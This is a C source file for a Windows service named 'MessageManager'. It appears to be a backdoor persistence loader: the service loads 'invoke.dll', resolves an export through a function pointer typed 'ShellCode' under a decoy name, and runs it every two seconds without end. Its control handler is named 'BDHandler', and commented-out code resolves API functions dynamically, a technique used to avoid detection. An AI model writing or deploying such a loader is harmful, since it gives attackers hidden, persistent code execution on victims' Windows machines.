#include <stdio.h>

#include <windows.h>  

void WINAPI BDHandler(DWORD dwControl);
void WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv);

typedef int(*ShellCode) ();

//HMODULE Advapi32 = LoadLibrary("Advapi32.dll");

SERVICE_STATUS ServiceStatus;
SERVICE_STATUS_HANDLE ServiceStatusHandle;
char ServiceName[] = "MessageManager";

void WINAPI ServiceMain(DWORD dwArgc, LPTSTR* lpszArgv) {
    //FARPROC fpFun0 = GetProcAddress(Advapi32, "RegisterServiceCtrlHandlerA");
    //RegisterServiceCtrlHandlerA_ RegisterServiceCtrlHandler = (RegisterServiceCtrlHandlerA_)*fpFun0;
    if (!(ServiceStatusHandle = RegisterServiceCtrlHandler((LPSTR)ServiceName,
        BDHandler))) return;
    ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
    ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
    ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP
        | SERVICE_ACCEPT_SHUTDOWN;
    ServiceStatus.dwServiceSpecificExitCode = 0;
    ServiceStatus.dwWin32ExitCode = 0;
    ServiceStatus.dwCheckPoint = 0;
    ServiceStatus.dwWaitHint = 0;
    //FARPROC fpFun1 = GetProcAddress(Advapi32, "SetServiceStatus");
    //SetServiceStatus_ SetServiceStatus = (SetServiceStatus_)*fpFun1;

    SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
    ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    ServiceStatus.dwCheckPoint = 0;
    ServiceStatus.dwWaitHint = 0;
    SetServiceStatus(ServiceStatusHandle, &ServiceStatus);
    HMODULE hDllLib = LoadLibrary("invoke.dll");
    FARPROC fpFun2 = GetProcAddress(hDllLib, "Invoke");
    ShellCode GetVersionToHelp32 = (ShellCode)*fpFun2;
    
    while (1){
        GetVersionToHelp32();
        Sleep(2000);
    }

    



}

void WINAPI BDHandler(DWORD dwControl)
{
    switch (dwControl)
    {
    case SERVICE_CONTROL_STOP:
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        break;
    case SERVICE_CONTROL_SHUTDOWN:
        ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        break;
    default:
        break;
    }
}

int  main()
{
    
    //FARPROC fpFun = GetProcAddress(Advapi32, "StartServiceCtrlDispatcherA");
    //StartServiceCtrlDispatcherA_ StartServiceCtrlDispatcher = (StartServiceCtrlDispatcherA_)*fpFun;
    SERVICE_TABLE_ENTRY ServiceTable[2];
    ServiceTable[0].lpServiceName = (LPSTR)ServiceName;
    ServiceTable[0].lpServiceProc = (LPSERVICE_MAIN_FUNCTION)ServiceMain;
    ServiceTable[1].lpServiceName = NULL;
    ServiceTable[1].lpServiceProc = NULL;
    StartServiceCtrlDispatcher(ServiceTable);
    
    return 0;
}

